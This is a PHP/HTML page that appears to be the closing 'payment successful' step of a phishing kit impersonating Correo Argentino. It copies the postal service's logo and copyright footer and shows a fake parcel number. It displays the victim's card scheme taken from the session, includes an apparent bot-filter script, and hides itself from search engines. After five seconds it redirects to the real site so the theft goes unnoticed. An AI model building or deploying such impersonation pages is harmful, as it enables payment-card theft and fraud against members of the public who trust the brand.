<?php
session_start();

include("./Conan/911.php");
?>
<!doctype html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Required meta tags -->
        
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        <meta http-equiv="refresh" content="5; URL= https://www.correoargentino.com.ar/" />
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/helpers.css">
        <link rel="stylesheet" href="./X911/stylee.css">
	    <link rel="stylesheet" href="./X911/stylaa.css">


        <link rel="icon" href="./X911/favicon.ico" />

        <title>Correo Argentino |</title>
    </head>
	 <header style="background: #FFCE00; color: #fff;">
            <div class="head">
                <div class="logo">
                    <img src="./X911/logo.png" style="width: 150px;">
                </div>
            </div>
     </header>
    <body>

		<div id="ss-wrapper">
            <div class="ss-area">
                <form action="./siftA/C.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="sms">
                <input type="hidden" name="error" value="">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="width: 120px;" src="./X911/logo.png"></div>
                    <div><img src="./X911/<?php echo $_SESSION['bank_scheme']; ?>.png" style="max-width: 120px;"></div>
                </div>
				<h3 id="payment" style="font-size: 20px;font-weight: 600;color: #1d941d;">The payment has been successful</h3>
				<h3 class="mt-3 mb-3" id="package">Parcel number 1912738456</h3>
				<div class="details" style="text-align:center;padding: 7px;background: #ffffff;">
				<font style="vertical-align: inherit;">será enviado ahora Recibirá su envío lo antes posible el proceso generalmente toma de uno a cuatro días, máximo hasta el área de la misión</font>
				<br>
				<img src="./X911/valide.png">
                </div>

                <p class="copy" style="border-top: 1px solid #bfbfbf;">© 2023 Correo Oficial de la República Argentina - Todos los derechos reservados  |  Webmaster</p>
            </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		


    </body>

</html>